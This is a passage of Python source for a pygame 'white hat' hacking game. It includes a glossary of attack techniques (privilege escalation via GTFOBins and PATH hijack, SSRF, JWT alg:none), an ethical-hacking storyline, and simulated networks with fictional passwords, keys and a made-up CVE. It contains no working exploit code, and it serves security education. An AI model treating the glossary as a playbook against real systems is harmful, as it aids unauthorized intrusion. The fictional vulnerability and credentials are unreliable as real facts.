# =============================================================
#  WHITE HAT :: NSH-infinity-plus -- TWO DOORS UPDATE
#  STORY MODE (22 missions) + ENDLESS MODE (procedural nets)
#  pip install pygame && python whitehat_twodoors.py
# =============================================================
import pygame, sys, math, random, json, os, re, hashlib
from array import array

pygame.mixer.pre_init(22050, -16, 1, 512)
pygame.init(); pygame.key.set_repeat(380, 40)
W, H, FPS = 1020, 680, 60
SAVE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitehat_td_save.json")
SETF = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitehat_td_settings.json")

def make_screen(full):
    flags = getattr(pygame, "SCALED", 0) | pygame.FULLSCREEN if full else 0
    try: return pygame.display.set_mode((W, H), flags)
    except Exception: return pygame.display.set_mode((W, H))
screen = make_screen(False)
pygame.display.set_caption("WHITE HAT :: two doors")
clock = pygame.time.Clock()

BG=(6,12,8); GREEN=(0,255,90); MDIM=(0,150,60); DDIM=(0,80,35)
PALE=(180,255,200); WHITE=(235,255,235); RED=(255,90,90); DIMRED=(150,50,50)
YELLOW=(255,210,60); CYAN=(80,220,220); ORANGE=(255,150,60); GRAY=(110,125,110)

def F(s): return pygame.font.SysFont("consolas,couriernew,monospace", s, bold=True)
F_T, F_S, F_M, F_B, F_H = F(14), F(16), F(20), F(30), F(54)
SCANL = pygame.Surface((W,H), pygame.SRCALPHA)
for y in range(0,H,3): pygame.draw.line(SCANL,(0,0,0,30),(0,y),(W,y))
def md5s(x): return hashlib.md5(x.encode()).hexdigest()

class Settings:
    def __init__(s):
        s.mute=False; s.scan=True; s.full=False; s.load()
    def load(s):
        try:
            with open(SETF) as f: d=json.load(f)
            s.mute=d.get("mute",False); s.scan=d.get("scan",True); s.full=d.get("full",False)
        except Exception: pass
    def save(s):
        try:
            with open(SETF,"w") as f:
                json.dump({"mute":s.mute,"scan":s.scan,"full":s.full},f)
        except Exception: pass
SET = Settings()

SND = {}
def _tone(fr,du,vo=0.3):
    rate,n=22050,int(22050*du)
    buf=array("h",(int(vo*32000*math.sin(2*math.pi*fr*i/rate)*(1-i/n)) for i in range(n)))
    return pygame.mixer.Sound(buffer=buf.tobytes())
def init_sounds():
    global SND
    try:
        if pygame.mixer.get_init() is None: raise RuntimeError
        SND={"key":_tone(1100,.02,.07),"tick":_tone(1500,.012,.045),"ok":_tone(660,.09,.22),
             "ok2":_tone(990,.12,.20),"bad":_tone(120,.25,.30),"win":_tone(523,.30,.25)}
    except Exception:
        class Mute:
            def play(s): pass
        SND={k:Mute() for k in ("key","tick","ok","ok2","bad","win")}
def sfx(n):
    if not SET.mute: SND[n].play()
def blink_on(r=400): return (pygame.time.get_ticks()//r)%2==0
def wrap(t,f,mw):
    out=[]
    for raw in t.split("\n"):
        if not raw: out.append(""); continue
        cur=""
        for w_ in raw.split(" "):
            s_=(cur+" "+w_).strip()
            if f.size(s_)[0]<=mw: cur=s_
            else:
                if cur: out.append(cur)
                cur=w_
        out.append(cur)
    return out
def draw_lines(sf,lns,f,c,x,y,lh=None):
    lh=lh or f.get_height()+4
    for i,l in enumerate(lns): sf.blit(f.render(l,True,c),(x,y+i*lh))
class Typer:
    def __init__(s,t,cps=90): s.t,s.cps,s.n=t,cps,0.0
    def update(s,dt): s.n=min(len(s.t),s.n+dt*s.cps)
    @property
    def shown(s): return s.t[:int(s.n)]
    @property
    def done(s): return int(s.n)>=len(s.t)
    def skip(s): s.n=len(s.t)
class MatrixRain:
    CH="01<>{}[]#$%*+=/\\|;:_"
    def __init__(s,w,h):
        s.font=F(16); s.cw=s.rh=18; s.h=h; s.cols=w//s.cw
        s.y=[random.uniform(-300,0) for _ in range(s.cols)]
        s.spd=[random.uniform(45,140) for _ in range(s.cols)]
        s.row=[int(v//s.rh) for v in s.y]; s.tails=["" for _ in range(s.cols)]
    def update(s,dt):
        for i in range(s.cols):
            s.y[i]+=s.spd[i]*dt; r=int(s.y[i]//s.rh)
            if r!=s.row[i]: s.row[i]=r; s.tails[i]=(random.choice(s.CH)+s.tails[i])[:10]
            if s.y[i]-10*s.rh>s.h:
                s.y[i]=random.uniform(-400,-40); s.tails[i]=""; s.row[i]=int(s.y[i]//s.rh)
    def draw(s,sf):
        for i in range(s.cols):
            x=i*s.cw
            for j,ch in enumerate(s.tails[i]):
                yy=s.y[i]-j*s.rh
                if yy<-s.rh or yy>s.h: continue
                c=PALE if j==0 else GREEN if j<4 else MDIM if j<7 else DDIM
                sf.blit(s.font.render(ch,True,c),(x,int(yy)))
def diamond(sf,cx,cy,r,c):
    pygame.draw.polygon(sf,c,[(cx,cy-r),(cx+r,cy),(cx,cy+r),(cx-r,cy)])

# =============================================================
#  CODEX + ACHIEVEMENTS
# =============================================================
CODEX = {
"Plaintext protocol":"FTP/Telnet/HTTP send data -- including passwords -- readable by anyone on the wire.",
"TLS":"Encrypts payloads with session keys from a visible handshake. Capture != read.",
"ARP spoofing":"ARP has zero verification. Duplicate IP + new MAC = man in the middle. DAI/802.1X defend.",
"Pivot":"Use one owned machine as a stepping stone to the next. Rotten edges expose cores.",
"Prepared statement":"SQL where data travels separately from code. One habit deletes injection.",
"UNION SELECT":"Appends attacker rows to a legit query result -- the classic data-dump move.",
"Stack canary":"Random value before the return address; checked before return. Trip = abort.",
"ASLR":"Address space layout randomization -- addresses shuffle per run. No leak, no aim.",
"DEP / NX":"Data pages can't execute. Your 0x41 sled is data, not code.",
"Client-side trust":"Checks living in the binary are suggestions. JNE->NOP deletes them.",
"Salt":"Random per-row value hashed with the password. Kills rainbow tables dead.",
"Rainbow table":"Precomputed password->hash pairs. Instant until salt shows up.",
"bcrypt":"Deliberately slow + salted password hash. Your storage choice = attacker speed.",
"PKI / CA":"Certificates bind keys to identities. The browser padlock is a CA vouching.",
"Hybrid encryption":"AES for bulk data; RSA only wraps the key + signs a hash. Every TLS connection.",
"Air gap":"Network physically disconnected. BLACKBIRD jumps it -- hence the name.",
"EternalBlue":"SMBv1 RCE (CVE-2017-0144). WannaCry's engine; 200k+ machines in days.",
"SUID":"Binary that runs with the owner's (often root's) privileges. Inventory them.",
"GTFOBins":"Unix binaries that can spawn shells (find, vim, tar...). sudo + GTFOBin = root.",
"PATH hijack":"SUID binary calls a command BY NAME; you own an earlier PATH dir. Plant it.",
"Cron job":"Scheduled task. Root cron + writable script = root code execution on a timer.",
"XSS":"Your input became the page's code in someone's browser. Output-encode everything.",
"Session cookie":"Whoever holds it IS the user. httpOnly hides it from JS; SameSite restricts sending.",
"JWT":"header.payload.signature. The signature binds the claims -- if you check it properly.",
"alg:none":"JWT with no signature. Servers must pin algorithms server-side, always.",
"OSINT":"Open-source intelligence: answers 'secret' questions with publicly posted life.",
"2FA":"Second factor beats any recovered password. Turn it on everywhere.",
"Vishing":"Voice phishing. Authority + urgency + fear; callback verification kills it.",
"SPF":"DNS record: which servers may send for a domain. fail = server not authorized.",
"DKIM":"Cryptographic signature over headers+body; survives forwarding.",
"DMARC":"Policy tying From-domain to SPF/DKIM alignment. Read all three together.",
"DNS tunneling":"Data smuggled in query labels. Watch egress DNS; alert on weird subdomains.",
"DNS cache poisoning":"Forged answer cached and served. DNSSEC + DoH/DoT defend.",
"TTL":"How long a DNS answer may be cached. A day-long TTL on a fresh lie is a red flag.",
"SSRF":"Server-side request forgery: your URL becomes the SERVER's request. Internal = reachable.",
"IMDSv2":"Cloud metadata requiring a session-token header. Kills plain SSRF metadata theft.",
"IAM role":"Cloud permissions set. Stolen temporary creds = the whole Kingdom sometimes.",
"Typosquatting":"'rquests' in the registry. One fat-fingered install = pwned.",
"Supply chain":"Poison what BUILDS the software, skip the wall. Verify everything, even us.",
"Default deny":"Implicit final rule: anything not allowed is dropped. The point of a firewall.",
"Least privilege":"Every identity, rule and role gets minimum rights needed. Nothing more.",
"Blast radius":"How much one popped box takes down. Segmentation caps it.",
"Rate limiting":"Per-IP request caps. Kills naive floods; annoys NAT users a little.",
"Scrubbing center":"Anycast absorptive capacity upstream. Rented armor, billed by the gigabit.",
"SLA":"Uptime promise. DDoS is an attack on it, measured in dropped customers.",
"UID 0 backdoor":"A second root account. Alert on ANY new UID 0. Always.",
"Log gap":"Logs don't take naps. A missing window = tampering. Ship logs off-box.",
"Exposure window":"Days a vulnerability is exploitable before you patch. Attackers count them.",
"MTTR":"Mean time to remediate. The patch-rush metric companies brag about.",
"Key management":"Keys never live next to what they unlock, never in git, never in screenshots.",
"Procedural net":"Endless mode: generated topology, seeded, always solvable by crack or CVE.",
"Trace multiplier":"Endless scaling: noise costs more the deeper you go. Slow is smooth.",
}
UNLOCK_MAP = {
 0:["Plaintext protocol","Key management"],1:["Prepared statement","UNION SELECT"],
 2:["Stack canary","ASLR","DEP / NX"],3:["Client-side trust"],
 4:["Pivot","Plaintext protocol"],5:["Salt","Rainbow table","bcrypt"],
 6:["PKI / CA","Hybrid encryption"],7:["Air gap","EternalBlue"],
 8:["SUID","GTFOBins","PATH hijack","Cron job"],
 9:["XSS","Session cookie","JWT","alg:none"],10:["OSINT","2FA"],
 11:["Vishing"],12:["SPF","DKIM","DMARC"],13:["TLS","ARP spoofing"],
 14:["DNS tunneling","DNS cache poisoning","TTL"],15:["SSRF","IMDSv2","IAM role"],
 16:["Typosquatting","Supply chain"],17:["Default deny","Least privilege"],
 18:["Rate limiting","Scrubbing center","SLA"],19:["Blast radius"],
 20:["UID 0 backdoor","Log gap"],21:["Exposure window","MTTR"],
}
ACH = {
 "first_blood":  ("FIRST CONTACT",      "Complete any mission or contract"),
 "ghost":        ("GHOST PROTOCOL",     "Finish a net job with TRACE never above 60"),
 "purist":       ("PURIST",             "All 3 SQL levels, zero hints"),
 "bass":         ("BASS PLAYER",        "Trip the stack canary"),
 "rainbow":      ("RAINBOW WARRIOR",    "Crack 4+ hashes in Hash Alley"),
 "keymaster":    ("KEYMASTER",          "Seal & Sign: 7/7"),
 "root":         ("ROOT ACCESS",        "Find all 3 privilege escalation paths"),
 "spook":        ("TUNNEL VISION",      "Decode Orion's DNS message"),
 "janitor":      ("CLOUD JANITOR",      "Break AND fully fix the metadata chain"),
 "mason":        ("MASON",              "Perfect run: checksum + all 3 typosquats"),
 "bouncer":      ("STORM SURGE",        "Finish Storm Shield with SLA >= 90"),
 "unlisted":     ("UNLISTED NUMBER",    "Survive the vishing call with 0 info leaked"),
 "keeper":       ("LIGHTHOUSE KEEPER",  "Complete every story mission"),
 "diver":        ("DEEP DIVE",          "Endless: clear depth 5"),
 "abyss":        ("THE ABYSS STARES BACK","Endless: clear depth 10"),
}
def rank_for(xp):
    if xp>=6000: return "ELITE"
    if xp>=3500: return "SENIOR ANALYST"
    if xp>=2000: return "ANALYST"
    if xp>=900:  return "TRAINEE-II"
    if xp>=300:  return "TRAINEE-I"
    return "RECRUIT"

# =============================================================
#  STORY DATA
# =============================================================
SPEAK_COL={"PATCH":GREEN,"KIP":CYAN,"ORION":RED,"YOU":PALE,"SYSTEM":GRAY,"DAVE":ORANGE}
PORTRAITS={
 "PATCH":[r"    ________    ",r"   /        \   ",r"  |  o  ##  |  ",r"  |    __   |  ",r"   \ \__/ /    ",r"    [PATCH]     "],
 "KIP":  [r"   __________   ",r"  (( o    o ))  ",r"  |    __    |  ",r"   \________/   ",r"    [KIP]       ",r"  ~ headph0nes ~"],
 "ORION":[r"   .########.   ",r"  /##########\  ",r"  |  -    -  |  ",r"  |     >    |  ",r"   \________/   ",r"    [ORION]     "],
 "YOU":  [r"     .----.     ",r"    / .  . \    ",r"   |   __   |   ",r"    \ ---- /    ",r"     [YOU]      "],
 "DAVE": [r"     .----.     ",r"    / o  o \    ",r"   |   --   |   ",r"   |\  ||  /|   ",r"    \_||__/     ",r"  [DAVE (IT)]   "],
}
PROLOGUE=[
 ("SYSTEM",">> RECORDING -- LIGHTHOUSE RECRUITMENT FILE 0x00 <<"),
 ("PATCH","Relax. If we wanted you arrested, there'd be no friendly warning screen."),
 ("PATCH","You got caught defacing a bakery website. With a script you downloaded. You didn't even write it."),
 ("PATCH","I'm Patch. I run the Lighthouse. We break into buildings -- with permission -- so the doors can be fixed."),
 ("PATCH","One rule: we only hack what we're authorized to hack. Cross it, and I walk you to the police myself."),
 ("KIP","o7 recruit!! kip, from the SOC. i make the graphs. you'll hear a LOT from me."),
 ("PATCH","First job's a warm-up. A bakery, of all things. Try to keep up."),
]
INTER_TITLES={0:"INTERLUDE :: red string",1:"INTERLUDE :: why we drill",2:"INTERLUDE :: the skeleton",
 3:"INTERLUDE :: reading the bones",4:"INTERLUDE :: message in a bottle",5:"INTERLUDE :: salt",
 6:"INTERLUDE :: keys",7:"INTERLUDE :: what you built",8:"INTERLUDE :: the deed",
 9:"INTERLUDE :: the session",10:"INTERLUDE :: the pet",11:"INTERLUDE :: the clinic",
 12:"INTERLUDE :: the kit",13:"INTERLUDE :: wiretap ethics",14:"INTERLUDE :: countdown",
 15:"INTERLUDE :: the mirror",16:"INTERLUDE :: the poisoned well",17:"INTERLUDE :: wave three",
 18:"INTERLUDE :: the flood recedes",19:"INTERLUDE :: compartments",20:"INTERLUDE :: six words"}
INTERLUDES={
 0:[("KIP","clean run! you only lit the trace meter twice. i've seen worse. i've BEEN worse."),
    ("PATCH","The bakery reuses passwords because their IT guy said it was fine. There's always a Dave."),
    ("KIP","speaking of dave: fired from the bakery. already 'security consultant' at two startups."),
    ("PATCH","Intel chatter keeps repeating one word: BLACKBIRD. I want sharp tools when it lands.")],
 1:[("PATCH","That portal you just shredded? Mirrored from a real site V0IDRAT dumped last month."),
    ("PATCH","A hospital's donor database. Names, appointment schedules, next-of-kin."),
    ("KIP","they posted it on a leak site. three weeks of disaster recovery."),
    ("PATCH","That's why the range matters. Every hole you learn to break, we go close in the real world first.")],
 2:[("PATCH","Today's drill is the oldest trick in the book: the buffer overflow."),
    ("PATCH","Fun fact: your K3NST4R paste included a C snippet with gets() in it. I recognized your style before I knew your name."),
    ("YOU","...I was fourteen."),
    ("KIP","walls have names. canary. ASLR. write them on your hand.")],
 3:[("PATCH","Today you read a program's bones. RE for security research is legal in most places -- piracy is not. Know the line."),
    ("KIP","the crackme only needed ONE valid key. then it's keygen city forever."),
    ("PATCH","V0IDRAT ships malware chained to cracked tools. Every keygen is a trojan with a pony tail."),
    ("PATCH","Next: their real leak. Passwords, stored wrong. Bring the rainbow table.")],
 4:[("KIP","so. ran the ransomware through the sandbox. build string reads: 'forked from K3NST4R, 2016'."),
    ("YOU","...that's my handle. I published my first scripts under that name. I was fourteen."),
    ("PATCH","V0IDRAT didn't steal your code, kid. They found it. Public paste site."),
    ("PATCH","Code you release is a message in a bottle. You don't choose who's standing on the beach."),
    ("PATCH","Not your fault. But if it comes back around, it will be your responsibility.")],
 5:[("KIP","unsalted md5 is basically a NAME TAG. same password = same hash. you SAW it."),
    ("PATCH","Salt makes every hash unique, and bcrypt is slow on purpose."),
    ("KIP","somebody tell the bakery. and half the internet.")],
 6:[("PATCH","Here. Your keypair. The public half goes to strangers. The private half NEVER leaves your machine."),
    ("KIP","your first signed commit!! i'm framing it. right next to dave's phishing email."),
    ("PATCH","One day you'll sign a vaccine with this key. Remember tonight.")],
 7:[("PATCH","So. BLACKBIRD is a worm that jumps air-gaps. And its spine is code you wrote at fourteen."),
    ("KIP","he knows we have the plans. he knows we KNOW his play."),
    ("PATCH","Then we learn everything about his web. Starting with his own front door.")],
 8:[("PATCH","A shell is a room. Root is the deed to the building."),
    ("PATCH","Every escalation you used was a CONFIGURATION mistake. All of it is least-privilege failing its homework."),
    ("KIP","orion's whole empire runs on ONE root box. no compartments. no audit logs. arrogance."),
    ("PATCH","Arrogance is attack surface. Write that on your hand too.")],
 9:[("KIP","we hold admin on their support portal. it's... a lot of tickets. RANSOMWARE CUSTOMER COMPLAINTS."),
    ("PATCH","We don't burn it. We watch it. Knowing their play before they make it -- that's the difference between us and them.")],
 10:[("YOU","I just took over a man's accounts with pictures of his dog."),
    ("PATCH","No exploits. No CVEs. Just oversharing and a reset form."),
    ("KIP","ps: the man changed his password to his cat's name. we're not telling him. it's funnier this way.")],
 11:[("PATCH","You did fine on that call. Most people don't. Seventy percent of breaches start with a human."),
    ("PATCH","Time you knew why I run a lighthouse instead of a prison yard."),
    ("PATCH","I was V0IDRAT before it had a name. Then a job went wrong. A clinic. Small enough to never make the news. Big enough to never leave me."),
    ("PATCH","I turned state's evidence. Orion ran the other way."),
    ("KIP","uh. boss? a package just arrived. no return address. should i... not touch it?"),
    ("PATCH","Later. Focus.")],
 12:[("PATCH","SPF, DKIM, DMARC. None of that existed when I built my phishing kit."),
    ("PATCH","Every standard that makes forgery harder is a door we old ghosts can't reopen. Good."),
    ("KIP","psa: dave's canary inbox caught a real one. he printed the headers and FRAMED them.")],
 13:[("KIP","okay so. the FTP passwords were SITTING there. like cookies on a plate."),
    ("PATCH","Authorized capture. Engagement letter, section 2. Never lose sight of that line.")],
 14:[("KIP","the decode. say it out loud. i want to hear someone else say it."),
    ("YOU","AIRGAP BREACH @ 0300."),
    ("PATCH","He routed his exfil through OUR resolvers and left us the timetable. Arrogance... or bait."),
    ("PATCH","At 03:00 we are at war. Castle wall first. Then compartments. Then we hunt his footprints.")],
 15:[("KIP","you stole a cloud role with a LINK PREVIEW. no exploit kit. a URL. one URL."),
    ("PATCH","IMDSv2. Egress allowlists. Least-privilege roles. We fix all three tonight."),
    ("KIP","and in that staging bucket... a CI bot token with his commits on it. he's inside our pipeline. i can FEEL it.")],
 16:[("KIP","that package would have opened a door INSIDE our CI. from the INSIDE."),
    ("PATCH","Orion's new move: don't attack the wall. Poison what builds the wall."),
    ("PATCH","Verify everything. Even us. Especially us.")],
 17:[("KIP","they probed every port we own. your rules held. mostly. we don't talk about wave three. (we WILL talk about wave three.)"),
    ("PATCH","It was a map job. And here comes the part I hate."),
    ("KIP","boss. SRV01. someone's INSIDE the lighthouse. right now. log-timestamp right now."),
    ("PATCH","A summer intern gave up a VPN login on a phone call last month. She reported it late -- scared to admit it."),
    ("PATCH","Policy, same day: reporting is ALWAYS safe here. Fear is how Orion wins, so fear doesn't get to live here.")],
 18:[("KIP","3.2 million requests per second. i graphed it. it looks like a mountain range having a panic attack."),
    ("PATCH","Scrubbing centers bought us the night. That's rented armor."),
    ("PATCH","His real move is quieter. Watch the inside. Draw the compartments.")],
 19:[("KIP","your breach sim matched the real attack. almost move for move. like he'd rehearsed it."),
    ("PATCH","Because he did. The compartments held -- printers, cameras, HR untouched."),
    ("PATCH","But the intruder was inside before we drew the lines. Now we read his footprints.")],
 20:[("KIP","the message in /etc/motd... he WANTED us to find it. six words and he owns the room."),
    ("YOU","You okay?"),
    ("PATCH","The clinic forgives me every day I keep this place running. He gets his six words when he earns them."),
    ("PATCH","He's coming tonight. Six servers. More holes than patch money. You save what matters.")],
}
HIJACK=[
 (0.4,"!! outbound channel compromised -- unknown actor speaking !!",RED),
 (1.1,"[UNKNOWN]: impressive. you read my network like a bedtime story.",RED),
 (1.3,"[UNKNOWN]: i read yours too. every night. 'skeleton by K3NST4R'. lovely bones.",RED),
 (1.3,"[UNKNOWN]: you built the spine of BLACKBIRD, kid. i only gave it wings.",RED),
 (1.0,"PATCH: kill the link. KILL IT NOW.",YELLOW),
 (0.5,"[SYSTEM] channel force-closed. counter-intel sweeping.",GRAY),
]
EPILOGUE_HEAD="EPILOGUE :: the other bottle"
EPILOGUE=[
 ("KIP","network held. blackbird died in our yard. i'm going to cry. don't look at me."),
 ("PATCH","The plans carry a build signature. Your old handle. Which means the vaccine signature is yours too."),
 ("YOU","So we burn BLACKBIRD?"),
 ("PATCH","We publish the vaccine. Open source, free, SIGNED with the key I gave you on night one. The bottle goes back in the water -- on purpose, this time."),
 ("PATCH","And the channel. I'm sending him one message. Six words: 'the clinic forgives you. come home.'"),
 ("PATCH","Whether he answers is about him, not us. But doors stay open in this line of work. That's the whole job."),
 ("DAVE","ps -- dave from IT emailed asking for a job. we hired him as a canary. he is THRIVING."),
]
EPI_VAR_HI=("SYSTEM",">> three weeks later: an unsigned commit appears in your vaccine repo. the style is familiar. the door stays open. <<")
EPI_VAR_MID=("SYSTEM",">> the channel stays silent. you keep the door unlocked anyway. some locks are for us, not them. <<")
EPI_VAR_LOW=("SYSTEM",">> somewhere, a paste site updates with new code. you'll be faster next time. the light stays on. <<")

# =============================================================
#  STORY NSH JOBS
# =============================================================
KIND_CODE={"c2":"C2","wks":"WK","srv":"SV","db":"DB","fw":"FW","mf":"MF"}
JOBS=[
dict(title="JOB 01 :: THE BAKERY LIST",
 brief=("PATCH: \"Frosted Bytes Bakery. Warm-up job. A rival may be bribing an\n"
        "employee for their client list. We're authorized to get the evidence.\"\n\n"
        "WHAT TO RETRIEVE:\n  >> client_list.csv -- somewhere on the 10.0.0.x net\n\n"
        "NSH QUICKSTART (type 'help'):\n  scan  probe <ip>  connect <ip>  crack <ip>  ls / cat / download\n\n"
        "Watch the TRACE meter -- noisy hacks attract the ICE."),
 nodes=[
  dict(ip="10.9.9.9",alias="c2",kind="c2",os="NSH Portable",pos=(.05,.5),links=["10.0.0.1"],ports={},password=None,vulns=[],files=[]),
  dict(ip="10.0.0.1",alias="gw-router",kind="fw",os="OpenWrt 19 (2020)",pos=(.30,.5),
       links=["10.9.9.9","10.0.0.15","10.0.0.20"],ports={22:"SSH"},password=None,vulns=[],
       files=[dict(name="dhcp_leases.log",size="1 KB",content="lease 10.0.0.15  reception-wks\nlease 10.0.0.20  filesrv01\n\n(recon lesson: logs give away your whole topology)")]),
  dict(ip="10.0.0.15",alias="reception",kind="wks",os="Windows 7 -- EOL, unpatched",pos=(.66,.26),
       links=["10.0.0.1"],ports={22:"SSH",445:"SMB"},password=("pastel123","~2 minutes @ 1 TH/s (word + numbers)",4),vulns=[],
       files=[dict(name="sticky_note.txt",size="1 KB",content="BRENDA'S DESK\n  filesrv password = same as this PC's\n  (IT said reusing passwords is 'probably fine')"),
        dict(name="cake_orders_q3.csv",size="88 KB",content="42x wedding, 17x birthday,\n1x 'divorce, make it SUPER chocolate'")]),
  dict(ip="10.0.0.20",alias="filesrv",kind="srv",os="Ubuntu 22.04 -- patched",pos=(.66,.78),
       links=["10.0.0.1"],ports={21:"FTP (plaintext!)",22:"SSH"},password=("pancake7","~1 minute @ 1 TH/s (word + digit)",5),vulns=[],
       files=[dict(name="readme.txt",size="1 KB",content="Client list lives here.\nIf you can read this, we have a problem. -- Dave (IT)"),
        dict(name="client_list.csv",size="212 KB",content="name,spend,notes\nMegaCorp,$120k,contact 'R.' matches rival bakery owner\nthree anonymous cash payments logged in March")])],
 objectives=[("10.0.0.20","client_list.csv")],
 lesson=["HOW CRACKING WORKED (the math):","   search space = charset ^ length",
 "   'pastel123'  ~ minutes @ 1 TH/s   'pancake7' ~ under a minute",
 "   'kV93#mQz!7fR$2p' 70^16 ~ 3e29    ~ 10 billion years","",
 "3 REAL RULES:","   1. LENGTH beats tricks: four random words > 8 weird chars.",
 "   2. NEVER reuse passwords (Brenda's sticky note = the whole job).",
 "   3. 'word + digit + !' is the FIRST pattern crackers try.","",
 "ALSO: FTP (21) is plaintext. Windows 7 is EOL. Logs leak topology."]),
dict(title="JOB 02 :: TRUST NO NODE",
 brief=("PATCH: \"A firm got a ransom note. Payroll, people's rent money.\n"
        "Get the key and the archive so we can disarm it.\"\n\n"
        "WHAT TO RETRIEVE:\n  >> vault.key          from hr-srv\n"
        "  >> payroll_2024.db    encrypted on hr-srv -- needs vault.key\n\n"
        "NEW TOOL:\n  decrypt <file.enc> <keyfile>   combine loot to break crypto\n\n"
        "Pivot: one weak node often opens the next one."),
 nodes=[
  dict(ip="10.9.9.9",alias="c2",kind="c2",os="NSH Portable",pos=(.05,.5),links=["10.0.1.1"],ports={},password=None,vulns=[],files=[]),
  dict(ip="10.0.1.1",alias="gw-router",kind="fw",os="OpenWrt 19 (2020)",pos=(.28,.5),
       links=["10.9.9.9","10.0.1.9","10.0.1.30","10.0.1.44"],ports={22:"SSH"},password=None,vulns=[],
       files=[dict(name="firewall_rules.txt",size="1 KB",content="allow tcp 22 -> 10.0.1.30 (legacy-wks)\nallow tcp 22 -> 10.0.1.44 (hr-srv)\n# TODO: that Telnet 23 on legacy-wks. someday. -- greg\ndeny all")]),
  dict(ip="10.0.1.9",alias="printer",kind="wks",os="HP LaserJet (fw 2006)",pos=(.72,.12),
       links=["10.0.1.1"],ports={9100:"JetDirect (raw)"},password=None,vulns=[],
       files=[dict(name="print_queue.log",size="2 KB",content="JOB#4411  'Q4-restructure_FINAL_v2.pdf'  x3 copies\n(nobody reads a printer's memory... we do)")]),
  dict(ip="10.0.1.30",alias="legacy-wks",kind="wks",os="Windows XP SP2 (2008!)",pos=(.60,.44),
       links=["10.0.1.1"],ports={23:"Telnet -- PLAINTEXT",139:"NetBIOS"},password=("qwerty","top-5 most common password -- instant",2),
       vulns=[("CVE-2008-4250","MS08-067 NetBIOS RCE","the hole Conficker crawled through in 2008 -- bypasses auth")],
       files=[dict(name="greg_notes.txt",size="1 KB",content="hr-srv password = my daughter's name + her birth year.\nCan't forget it! (crackers can GUESS it)")]),
  dict(ip="10.0.1.44",alias="hr-srv",kind="srv",os="Debian 11 -- patched",pos=(.60,.80),
       links=["10.0.1.1"],ports={22:"SSH"},password=("Isabella2011","name+year = dictionary attack -- days, not centuries",6),vulns=[],
       files=[dict(name="vault.key",size="1 KB",content="-----BEGIN BLACKBIRD KEY-----\n9f8e7d6c5b4a3210fedcba9876543210\n-----END BLACKBIRD KEY-----\n(never store keys next to what they unlock)"),
        dict(name="payroll_2024.db.enc",size="40 MB",enc=True,content="(encrypted payroll database)"),
        dict(name="birthday_list.txt",size="2 KB",content="'Winter2024!' becomes 'Spring2024!'. that's not security.")])],
 objectives=[("10.0.1.44","vault.key"),("10.0.1.44","payroll_2024.db")],
 lesson=["WHAT TODAY TAUGHT:",
 " * Telnet (23) = passwords in the clear. SSH or nothing.",
 " * MS08-067: one unpatched hole enslaved millions (Conficker/WannaCry).",
 " * 'Isabella2011' LOOKS strong -- name+year is one dictionary away.",
 " * vault.key sat NEXT TO the data it unlocks. Key management matters.",
 " * Pivoting: the rotten edge (an XP box) exposed the core. Segment!"]),
dict(title="JOB 03 :: THE VAULT",
 brief=("PATCH: \"Final offensive job. V0IDRAT hid schematics for BLACKBIRD --\n"
        "a worm that jumps air-gaps -- inside a hardened mainframe.\"\n\n"
        "WHAT TO RETRIEVE:\n  >> blackbird.key                from archive (anon FTP?!)\n"
        "  >> project_blackbird_plans.dat  encrypted on db-main -- needs key\n\n"
        "INTEL:\n  * edge-fw refuses every connect. Probe it.\n"
        "  * db-main's password is 16 random characters -- brute force is\n"
        "    dead. find a vulnerability instead."),
 nodes=[
  dict(ip="10.9.9.9",alias="c2",kind="c2",os="NSH Portable",pos=(.05,.5),links=["10.2.0.1"],ports={},password=None,vulns=[],files=[]),
  dict(ip="10.2.0.1",alias="edge-fw",kind="fw",os="VendorOS 4.2 (2019, never patched)",pos=(.30,.5),
       links=["10.9.9.9","10.2.0.50","10.2.0.60","10.2.0.77"],blocks=True,ports={443:"Admin HTTPS",22:"SSH"},password=None,
       vulns=[("CVE-2024-1337","FW-Mangle -- unauth admin RCE","edge devices: exposed admin UI, patched by almost no one")],
       files=[dict(name="rules.conf",size="1 KB",content="deny all inbound   # (spoiler: the firewall ITSELF is the hole)\nallow -> 10.2.0.77 db-main")]),
  dict(ip="10.2.0.50",alias="mail",kind="srv",os="Exchange 2016 -- patched",pos=(.66,.20),
       links=["10.2.0.1"],ports={25:"SMTP",443:"OWA"},password=("Summer2024!","seasonal + year + '!' -- crackers try these FIRST",5),vulns=[],
       files=[dict(name="it_notice.eml",size="2 KB",content="REMINDER: archive server still allows ANONYMOUS FTP.\nTicket #5521 open since March 2021. Sigh. -- IT")]),
  dict(ip="10.2.0.60",alias="archive",kind="srv",os="FreeNAS 9 (2014)",pos=(.66,.5),
       links=["10.2.0.1"],ports={21:"FTP -- ANONYMOUS LOGIN ENABLED"},password=None,vulns=[],
       files=[dict(name="blackbird.key",size="1 KB",content="-----BEGIN BLACKBIRD KEY-----\n00ff11aa22bb33cc44dd55ee66ff7788\n-----END BLACKBIRD KEY-----\n(sitting on an anonymous FTP. in 2025.)")]),
  dict(ip="10.2.0.77",alias="db-main",kind="mf",os="RHEL 9 -- patched, monitored",pos=(.66,.82),
       links=["10.2.0.1"],ports={22:"SSH",445:"SMBv1 -- WHY?!"},
       password=("kV93#mQz!7fR$2p","~4x10^27 years @ 1 TH/s -- effectively forever",None),
       vulns=[("CVE-2017-0144","EternalClass -- SMBv1 RCE","WannaCry's cousin. somebody left SMBv1 turned on")],
       files=[dict(name="project_blackbird_plans.dat.enc",size="1.2 GB",enc=True,content="(encrypted: BLACKBIRD worm schematics)"),
        dict(name="it_budget.xlsx",size="1 KB",content="SMBv1 removal ticket: 'blocked -- legacy printer'")])],
 objectives=[("10.2.0.60","blackbird.key"),("10.2.0.77","project_blackbird_plans.dat")],
 lesson=["THE VAULT, DECONSTRUCTED:",
 " * An unpatched edge firewall = front door open.",
 " * Anonymous FTP (21) holding REAL keys: free loot.",
 " * db-main did everything right except ONE legacy service (SMBv1) --",
 "   the same hole as WannaCry 2017, which hit 200,000+ machines.",
 " * REAL security = LAYERS. One layer is never enough.",
 " * White-hat rule: you found these holes so they can be CLOSED."]),
]
SANDBOX=dict(title="SANDBOX :: practice range",trace_mult=1.0,
 nodes=[
  dict(ip="10.9.9.9",alias="c2",kind="c2",os="NSH Portable",pos=(.05,.5),links=["10.5.0.1"],ports={},password=None,vulns=[],files=[]),
  dict(ip="10.5.0.1",alias="lab-router",kind="fw",os="OpenWrt (lab)",pos=(.30,.5),
       links=["10.9.9.9","10.5.0.10","10.5.0.20","10.5.0.30"],ports={22:"SSH"},password=None,vulns=[],
